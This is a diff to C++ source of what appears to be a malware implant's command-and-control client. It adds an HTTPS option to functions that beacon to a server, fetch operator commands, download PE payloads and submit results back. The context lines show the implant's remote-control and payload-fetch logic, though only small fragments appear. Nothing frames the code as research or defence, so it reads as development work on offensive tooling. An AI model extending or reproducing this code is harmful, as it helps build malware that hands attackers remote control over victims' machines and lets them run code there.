@@ -118,7 +118,8 @@ string send_beacon(const string& agent_id, const string& results_data = "") {
         RESULTS_PATH,
         USER_AGENT,
         HEADER,
-        b64_encoded
+        b64_encoded,
+        USE_HTTPS
     );
 
     return response;
@@ -154,7 +155,8 @@ vector<pair<int64_t, string>> fetch_commands(const string& agent_id) {
         "/api/command",
         USER_AGENT,
         HEADER,
-        b64_encoded
+        b64_encoded,
+        USE_HTTPS
     );
 
     if (response.empty()) {
@@ -279,7 +281,8 @@ string fetch_pe_data(int64_t command_id) {
         XOR_PORT,
         path,
         USER_AGENT,
-        HEADER
+        HEADER,
+        USE_HTTPS
     );
 
     if (response.empty()) {
@@ -359,7 +362,8 @@ bool submit_result(const string& agent_id, int64_t command_id, const string& out
         "/api/result",
         USER_AGENT,
         HEADER,
-        b64_encoded
+        b64_encoded,
+        USE_HTTPS
     );
 
     if (response.empty()) {
